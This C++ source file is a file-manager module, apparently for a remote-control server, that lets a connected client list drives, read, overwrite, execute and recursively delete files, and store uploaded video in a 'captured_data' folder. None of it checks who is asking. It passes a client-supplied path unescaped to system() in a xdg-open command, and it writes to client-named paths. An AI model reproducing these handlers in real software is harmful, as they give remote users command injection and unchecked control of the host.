#include "FileManager.hpp"

namespace fs = std::filesystem;

// --- HELPER: BASE64 DECODE (Để nhận video từ JSON) ---
static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

static bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
  int in_len = encoded_string.size();
  int i = 0; int j = 0; int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];
  std::vector<unsigned char> ret;

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = base64_chars.find(char_array_4[i]);
      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
      for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
      i = 0;
    }
  }
  if (i) {
    for (j = i; j <4; j++) char_array_4[j] = 0;
    for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
  }
  return ret;
}

// ----------------------------------------------------

json FileManager::handle_command(const json& request) {
    std::string cmd = request.value("command", "");
    
    // 1. LIST_DIR (Liệt kê file/ổ đĩa)
    if (cmd == "LIST_DIR") {
        json file_list = json::array();
        std::string req_path = "";
        if (request.contains("payload") && request["payload"].contains("path")) {
            req_path = request["payload"]["path"];
        }

        // Nếu path rỗng -> Trả về danh sách ổ đĩa (C:\, D:\)
        if (req_path.empty()) {
            #ifdef _WIN32
                char buffer[256];
                GetLogicalDriveStringsA(256, buffer);
                char* drive = buffer;
                while (*drive) {
                    file_list.push_back({ {"name", std::string(drive)}, {"type", "drive"}, {"path", std::string(drive)} });
                    drive += strlen(drive) + 1;
                }
                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, {"current_path", ""}, {"data", file_list}};
            #else
                req_path = "/";
            #endif
        }

        try {
            if (fs::exists(req_path) && fs::is_directory(req_path)) {
                for (const auto& entry : fs::directory_iterator(req_path)) {
                    try {
                        std::string filename = entry.path().filename().string();
                        std::string type = entry.is_directory() ? "dir" : "file";
                        uintmax_t size = (!entry.is_directory()) ? entry.file_size() : 0;
                        
                        // Detect extension
                        std::string ext = entry.path().extension().string();
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                        if(ext == ".webm" || ext == ".mp4") type = "video";
                        if(ext == ".jpg" || ext == ".png") type = "image";

                        file_list.push_back({
                            {"name", filename}, {"type", type}, {"size", size}, {"path", entry.path().string()}
                        });
                    } catch (...) { continue; }
                }
                return {{"status", "success"}, {"module", "FILE"}, {"command", "LIST_DIR"}, 
                        {"current_path", fs::absolute(req_path).string()}, {"data", file_list}};
            }
        } catch (const std::exception& e) { return {{"status", "error"}, {"message", e.what()}}; }
    }

    // 2. READ_TEXT (Đọc nội dung file gửi về Client sửa)
    else if (cmd == "READ_TEXT") {
        std::string path = request["payload"].value("path", "");
        std::ifstream file(path);
        if (file.is_open()) {
            std::stringstream buffer;
            buffer << file.rdbuf();
            return {
                {"status", "success"}, 
                {"module", "FILE"}, 
                {"command", "READ_TEXT"}, 
                {"path", path},
                {"content", buffer.str()} // Nội dung file
            };
        }
        return {{"status", "error"}, {"message", "Cannot open file"}};
    }

    // 3. WRITE_TEXT (Ghi đè nội dung file - Cẩn thận khi dùng!)
    else if (cmd == "WRITE_TEXT") {
        std::string path = request["payload"].value("path", "");
        std::string content = request["payload"].value("content", "");
        
        std::ofstream file(path, std::ios::trunc); // Truncate = Xóa cũ ghi mới
        if (file.is_open()) {
            file << content;
            return {{"status", "success"}, {"message", "File saved successfully"}};
        }
        return {{"status", "error"}, {"message", "Cannot write file (Access Denied?)"}};
    }

    // 4. EXECUTE (Chạy file .exe, .bat...)
    else if (cmd == "EXECUTE") {
        std::string path = request["payload"].value("path", "");
        #ifdef _WIN32
            ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            return {{"status", "success"}, {"message", "Executed"}};
        #endif
    }

    // 5. DELETE (Xóa file/folder)
    else if (cmd == "DELETE") {
        std::string path = request["payload"].value("path", "");
        try {
            if (fs::remove_all(path)) return {{"status", "success"}, {"message", "Deleted"}};
        } catch (...) {}
        return {{"status", "error"}, {"message", "Delete failed"}};
    }

    // 1. LIST: Liệt kê cả ảnh và video
    if (cmd == "LIST") {
        json file_list = json::array();
        std::string path = "captured_data";
        if (!fs::exists(path)) fs::create_directory(path);

        if (fs::exists(path) && fs::is_directory(path)) {
            for (const auto& entry : fs::directory_iterator(path)) {
                std::string ext = entry.path().extension().string();
                if (ext == ".jpg" || ext == ".webm" || ext == ".mp4") {
                    file_list.push_back({
                        {"name", entry.path().filename().string()},
                        {"size", entry.file_size()},
                        {"type", (ext == ".jpg" ? "image" : "video")}
                    });
                }
            }
        }
        return {
            {"status", "success"}, {"module", "FILE"},
            {"command", "LIST"}, {"data", file_list}
        };
    }

    // [MỚI] LỆNH THỰC THI FILE (Mở file trên máy Server)
    if (cmd == "EXECUTE") {
        std::string path = request["payload"].value("path", "");
        
        if (path.empty()) return {{"status", "error"}, {"message", "Missing path"}};

        #ifdef _WIN32
            // ShellExecute tự động chọn ứng dụng phù hợp để mở file
            // (VD: .txt mở bằng Notepad, .png mở bằng Photos, .exe thì chạy luôn)
            HINSTANCE result = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWNORMAL);
            
            if ((intptr_t)result > 32) {
                return {{"status", "success"}, {"message", "File executed successfully"}};
            } else {
                return {{"status", "error"}, {"message", "Failed to execute file"}};
            }
        #else
            std::string cmd_linux = "xdg-open \"" + path + "\" &";
            system(cmd_linux.c_str());
            return {{"status", "success"}, {"message", "Executed command"}};
        #endif
    }
    
    // 2. SAVE_VIDEO: Nhận video từ Client và lưu xuống ổ cứng
    else if (cmd == "SAVE_VIDEO") {
        if (request.contains("payload")) {
            std::string name = request["payload"].value("name", "video.webm");
            std::string b64Data = request["payload"].value("data", "");
            
            if (!b64Data.empty()) {
                std::vector<unsigned char> binaryData = base64_decode(b64Data);
                
                std::string path = "captured_data/" + name;
                std::ofstream file(path, std::ios::binary);
                if (file.is_open()) {
                    file.write(reinterpret_cast<const char*>(binaryData.data()), binaryData.size());
                    file.close();
                    std::cout << "[FILE] Video saved: " << path << " (" << binaryData.size() << " bytes)\n";
                    return {{"status", "success"}, {"message", "Video saved successfully"}};
                }
            }
        }
        return {{"status", "error"}, {"message", "Failed to save video"}};
    }

    return {{"status", "ok"}}; 
}

// Giữ nguyên hàm read_file_binary cũ
bool FileManager::read_file_binary(const std::string& filename, std::vector<uint8_t>& out_data) {
    std::string full_path = "captured_data/" + filename;
    std::ifstream file(full_path, std::ios::binary);
    if (!file.is_open()) return false;
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    out_data.resize(size);
    file.read(reinterpret_cast<char*>(out_data.data()), size);
    return true;
}
